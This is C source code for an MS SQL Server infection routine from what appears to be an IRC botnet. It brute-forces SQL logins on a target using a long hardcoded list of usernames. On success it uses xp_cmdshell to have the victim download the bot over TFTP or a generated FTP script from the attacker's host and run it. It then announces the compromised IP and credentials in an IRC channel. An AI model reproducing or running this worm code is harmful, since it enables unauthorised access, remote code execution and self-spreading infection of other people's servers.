#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_MSSQL

BOOL MSSQL(EXINFO exinfo)
{
	char sendbuf[IRCLINE];
	char *users[] = {"Administrator", "Administrateur" ,"Coordinatore","Administrador",
					"Verwalter","Ospite", "kanri", "kanri-sha", "admin", "administrator", "Default", \
					"Convidado", "mgmt", "Standard", "User", "Administratör", "Cool", \
					"administrador", "Owner", "user", "server", "Win", "John", "Admin", \
					"Administrador", "0wner", "User", "Sserver", "WIN", "JOHN", "ADMIN", \
					"Test", "Guest", "Gast", "Inviter", "a", "aaa", "abc", "ABC", "x", "xyz", \
					"Dell", "home", "pc", "test", "temp", "win", "asdf", "qwer", \
					"OEM", "root", "wwwadmin", "login", "Oem", "WinXp", "Windows", \
     				"owner", "mary", "mike", "george", "jim", "tim", "tom", "Tommy", \
					"stacy", "stacey", "colin", "mark", "erik", "peter", "patrick", \
					"bill", "steve", "dick", "stefan", "steven", "kate", "kt", "Fuck", "School", \
					"karl", "mypc", "Microsoft", "123", "Killer", "Help", "Nazi", "Fucker", \
					"test", "guest", "gast", "inviter", "A", "AAA", "Abc", "ABC", "X", "XYZ", \
					"dell", "Home", "Pc", "qaz", "Temp", "Win", "ASDF", "QWER", \
					"0EM", "Root", "WwwAdmin", "Login", "Oem", "Winxp", "Windows", "Win2003", \
     				"Owner", "Mary", "Mike", "George", "Jim", "Tim", "Tom", "tommy", \
					"Stacy", "Stacey", "Colin", "Mark", "Erik", "Peter", "Patrick", \
					"Bill", "Sucker", "Dick", "Game", "Steven", "Spider", "007", "fuck", "school", \
					"Ass", "MyPc", "microsoft", "123", "killer", "help", "nazi", "Fucked", \
					"admins", "computer", "xp", "windows", "WinNt", "Hacker", "Hacked", \
					"Admins", "Computer", "Xp", "Windows", "Winnt", "hacker", "Exploited", \
     				"OWNER", "mysql", "sql", "database", "teacher", "student", "family", \
     				"Owner", "Mysql", "SQL", "Database", "Teacher", "Student", "Family", \
					"Pepsi", "7up", "Gov", "DataBase", "Account", "Glass", "Lover", \
					"MSN", "Paltalk", "gov", "Line", "account", "glass", "lover", \
					"government", "Army", "Government", "army", "Command", "command", "Sol", \
					"Soldier", "Ryan", "ryan", "Nancy", "soldier", "Ss", "ss", \
					"Commander", "commander", "oscar", "Oscar", "paltalk", "Www", "www", \
					"http", "service", "Service", "Services", "services", "Hotel", "hotel", \
					"CIA", "cia", "mossaf", "Mossad", "Cia", "KGB", "Kgb", \
					"kgb", "Jessus", "Lamer", "Kid", "kid", "Rap", "DJ", \
					"Power", "power", "main", "Dr", "dr", "Evil", "devil", \
					"sa", "admin",
					 NULL };
	char database[]="";

	BOOL bRet=FALSE;

	SQLHANDLE hEnv;
	SQLHDBC hDbc = SQL_NULL_HDBC;     
	SQLHSTMT hStmt = SQL_NULL_HSTMT;
    SQLCHAR szOutConn[1024], constr[1024], command[1024];
	SQLSMALLINT sLen;

	if (fSQLAllocHandle(SQL_HANDLE_ENV,SQL_NULL_HANDLE,&hEnv) != SQL_SUCCESS)
		return bRet;

	if (fSQLSetEnvAttr(hEnv, SQL_ATTR_ODBC_VERSION,(SQLPOINTER) SQL_OV_ODBC3, SQL_IS_INTEGER) != SQL_SUCCESS)
		return bRet;

	if (fSQLAllocHandle(SQL_HANDLE_DBC,hEnv,(SQLHDBC FAR*)&hDbc) != SQL_SUCCESS) {
		fSQLFreeHandle(SQL_HANDLE_ENV, hEnv);
		return bRet;
	}

	for (int i=0; users[i]; i++) {
		for (int j=0; passwords[j]; j++) {
			sprintf((char *)constr, "DRIVER={SQL Server};SERVER=%s,%d;UID=%s;PWD=%s;%s",exinfo.ip,exinfo.port,users[i],passwords[j],database); 
			SQLRETURN nResult = fSQLDriverConnect(hDbc, NULL, constr, (SQLSMALLINT)strlen((char *)constr), szOutConn, 1024, &sLen, SQL_DRIVER_NOPROMPT);
			if (nResult != SQL_ERROR) {
				fSQLAllocHandle(SQL_HANDLE_STMT,hDbc, &hStmt);
				if (UseTFTP)
					sprintf((char *)command, "EXEC master..xp_cmdshell 'tftp -i %s GET %s&%s'\r\n", GetIP(exinfo.sock),filename,filename);
				else 
					sprintf((char *)command, "EXEC master..xp_cmdshell 'echo open %s %d > o&echo user 1 1 >> o &echo get %s >> o &echo quit >> o &ftp.exe -n -s:o&%s'\r\n", GetIP(exinfo.sock), ftpport, filename, filename);
				fSQLExecDirect(hStmt, (SQLTCHAR*)&command, SQL_NTS);
				/*Sleep(5000);
				sprintf((char *)command, "EXEC master..xp_cmdshell '%s'\r\n", filename);
				fSQLExecDirect(hStmt, (SQLTCHAR*)&command, SQL_NTS);*/
				
				//sprintf(sendbuf,"[TFTP]: File transfer complete to IP: %s", exinfo.ip);
				for (int k=0; k < 6; k++) {
					if (searchlog(sendbuf)) {
						bRet=TRUE;
						_snprintf(sendbuf,sizeof(sendbuf),"[%s]: Exploiting IP: (%s:%d) User: (%s/%s).",
							exploit[exinfo.exploit].name, exinfo.ip, exinfo.port, users[i], passwords[j]);
						if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, sendbuf, exinfo.notice);
						addlog(sendbuf);
						exploit[exinfo.exploit].stats++;
						
						break;
					}
					Sleep(5000);
				}
				fSQLDisconnect(hDbc);
				fSQLFreeHandle(SQL_HANDLE_STMT, hStmt);

				break;
			}
			Sleep(500);
		}
		if (bRet == TRUE)
			break;
	}

	fSQLFreeHandle(SQL_HANDLE_DBC, hDbc);
	fSQLFreeHandle(SQL_HANDLE_ENV, hEnv);

	return bRet;
}
#endif